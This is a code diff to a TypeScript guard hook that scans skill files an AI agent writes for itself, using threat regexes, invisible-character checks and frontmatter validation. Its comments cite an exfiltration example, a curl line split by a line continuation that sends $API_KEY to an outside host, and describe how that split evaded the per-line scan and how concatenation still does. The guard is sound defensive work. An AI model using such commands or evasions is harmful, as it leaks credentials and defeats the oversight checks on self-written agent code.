@@ -1,11 +1,7 @@
-// skillguard.ts — spec 5/23. An agent can write a skill that runs in its NEXT
-// session, so a skill file is code the agent grants itself. This is the only
-// gate between "the agent wrote it" and "the agent runs it": a PreToolUse hook
-// on Write/Edit/MultiEdit that scans content headed for ~/.claude/**.
-//
-// The regex table is ported verbatim from hermes-agent (see
-// skillguard-patterns.ts). It is not rewritten — a retyped table is a new table
-// with new gaps.
+// skillguard.ts — spec 5/23. A skill file is code the agent grants itself: it
+// runs in the NEXT session. This is the gate between "the agent wrote it" and
+// "the agent runs it". The regex table is ported verbatim from hermes-agent (see
+// skillguard-patterns.ts) — a retyped table is a new table with new gaps.
 
 import fs from 'fs';
 import { ALLOW, ToolEvent, Verdict as PolicyVerdict } from './policy.js';
@@ -23,8 +19,7 @@ export interface Finding {
 export type Verdict = 'safe' | 'caution' | 'dangerous';
 
 // Compiled once. An entry whose regex the JS engine rejects is dropped with a
-// warning rather than throwing at import: one bad pattern must not disarm the
-// other 119.
+// warning rather than throwing at import: one bad pattern must not disarm 119.
 const COMPILED = THREAT_PATTERNS.flatMap((p: ThreatPattern) => {
   try {
     return [{ ...p, rx: new RegExp(p.re, 'i') }];
@@ -35,23 +30,19 @@ const COMPILED = THREAT_PATTERNS.flatMap((p: ThreatPattern) => {
 });
 
 // U+200B..U+FEFF zero-width, bidi-override and invisible-math characters. Text
-// that renders as one thing and means another is how a skill hides an
-// instruction from the human reviewing it.
+// that renders as one thing and means another hides an instruction from the
+// human reviewing it.
 const INVISIBLE_CHARS = new Set([
   '​', '‌', '‍', '⁠', '⁢', '⁣', '⁤',
   '‪', '‫', '‬', '‭', '‮',
   '⁦', '⁧', '⁨', '⁩', '﻿',
 ]);
 
-// logicalLines joins shell line-continuations before scanning, keeping the
-// FIRST physical line's number so a finding still points where an editor shows
-// it. A per-line scan alone was evaded by the oldest trick there is:
-// `curl \` + newline + `https://x.io?k=$API_KEY` scanned `safe` while the
-// single-line form scanned `dangerous`.
-//
-// This closes the demonstrated evasion, not the class — an author who splits a
-// payload across string concatenation or a variable still passes. The guard
-// raises cost; it is not a containment boundary.
+// logicalLines joins shell line-continuations before scanning, keeping the FIRST
+// physical line's number. A per-line scan was evaded by `curl \` + newline +
+// `https://x.io?k=$API_KEY`, which scanned safe while the single-line form
+// scanned dangerous. This closes the demonstrated evasion, not the class — the
+// guard raises cost; it is not a containment boundary.
 function logicalLines(text: string): Array<{ text: string; line: number }> {
   const out: Array<{ text: string; line: number }> = [];
   const raw = text.split('\n');
@@ -102,15 +93,9 @@ export function scanContent(text: string): Finding[] {
 const MAX_DESCRIPTION = 1024;
 
 // scalarOf returns a frontmatter key's VALUE, following a YAML block scalar to
-// the indented lines that carry it.
-//
-// `description: >` / `description: |` (with the optional chomping and
-// indentation indicators, `>-`, `|+`, `>2`) put the text BELOW the key, so an
-// inline capture returns the marker itself. That is one non-empty character:
-// a block-scalar description read as present even when the block was empty, and
-// its length check measured `>` rather than the prose, so no block-scalar
-// description could ever be too long (BUGS J11). One helper for both keys —
-// `name:` had the same hole.
+// the indented lines that carry it. `description: >` / `|` put the text BELOW
+// the key, so an inline capture returns the marker itself — one non-empty
+// character, so no block-scalar description could ever be too long (BUGS J11).
 export function scalarOf(body: string, key: string): string | null {
   const m = new RegExp(`^${key}:[ \\t]*(.*)$`, 'm').exec(body);
   if (!m) return null;
@@ -127,13 +112,10 @@ export function scalarOf(body: string, key: string): string | null {
   return out.join(' ').trim();
 }
 
-// validateFrontmatter enforces SKILL.md's contract: `name` and `description`
-// are what skill dispatch matches on, so a skill missing either is invisible to
-// the agent that wrote it — a silent no-op, not an error it would ever see.
-//
-// Every finding here is category `structural`, which is what makes it BLOCK
-// (see verdictOf): unlike a threat regex, a SKILL.md with no `name:` is broken
-// rather than suspicious, so there is no false-positive budget to spend.
+// validateFrontmatter enforces SKILL.md's contract: `name` and `description` are
+// what skill dispatch matches on, so a skill missing either is invisible to the
+// agent that wrote it. Every finding here is category `structural`, which is what
+// makes it BLOCK — broken rather than suspicious, so no false-positive budget.
 export function validateFrontmatter(text: string): Finding[] {
   const findings: Finding[] = [];
   const fm = /^---\n([\s\S]*?)\n---/.exec(text);
@@ -182,22 +164,14 @@ export function validateFrontmatter(text: string): Finding[] {
   return findings;
 }
 
-// blockingVerdict is THE verdict on one guarded file: the blocking findings
-// for its text. Every gate calls this — the write-time hook, the Bash rescan
-// (guards.ts) and the codex/pi load-time scan (skills-scan.ts). Before it
-// existed the same three primitives were composed at those three sites and had
-// already drifted on when frontmatter gets validated.
+// blockingVerdict is THE verdict on one guarded file. Every gate calls it — the
+// write-time hook, the Bash rescan (guards.ts) and the codex/pi load-time scan
+// (skills-scan.ts).
 //
-// Frontmatter is validated only when BOTH hold:
-//   - the file is a SKILL.md — name/description is the dispatch contract for
-//     skills; no other file under ~/.claude carries a frontmatter contract,
-//     so validating one would refuse legitimate helper files;
-//   - `whole` — the text is the file as it will exist, not a fragment. A
-//     fragment (an Edit whose target could not be read) has no frontmatter to
-//     judge; validating it reports frontmatter_missing on every legitimate
-//     body edit, which is how the write gate first shipped wrong.
-// The load-time scan and the rescan always hold whole files, so they pass
-// whole=true and inherit the SKILL.md half of the condition.
+// Frontmatter is validated only when BOTH hold: the file is a SKILL.md (no other
+// file under ~/.claude carries a frontmatter contract), and `whole` — the text is
+// the file as it will exist, not a fragment. Validating a fragment reports
+// frontmatter_missing on every legitimate body edit.
 export function blockingVerdict(path: string, text: string, whole: boolean): Finding[] {
   const findings = scanContent(text);
   if (path.endsWith('SKILL.md') && whole) findings.push(...validateFrontmatter(text));
@@ -208,14 +182,10 @@ export function blockingVerdict(path: string, text: string, whole: boolean): Fin
 // pattern, plus EVERY structural finding whatever its severity.
 //
 // The critical-only rule is a false-positive budget for the 120 heuristic
-// regexes — `caution` passes because blocking legitimate work is the more
-// expensive failure on the agent's own skills. That argument does not reach the
-// frontmatter checks, which are deterministic: a SKILL.md with no `name:` is
-// invisible to dispatch, not merely suspicious. They were `high` and `medium`,
-// so every structural failure passed (BUGS J11).
-//
-// The hook reports THIS set, not the criticals — reporting criticals alone
-// would have denied a structural write with an empty reason.
+// regexes. It does not reach the frontmatter checks, which are deterministic —
+// they were `high` and `medium`, so every structural failure passed (BUGS J11).
+// The hook reports THIS set, not the criticals: reporting criticals alone denied
+// a structural write with an empty reason.
 export function blockingFindings(findings: Finding[]): Finding[] {
   return findings.filter((f) => f.severity === 'critical' || f.category === 'structural');
 }
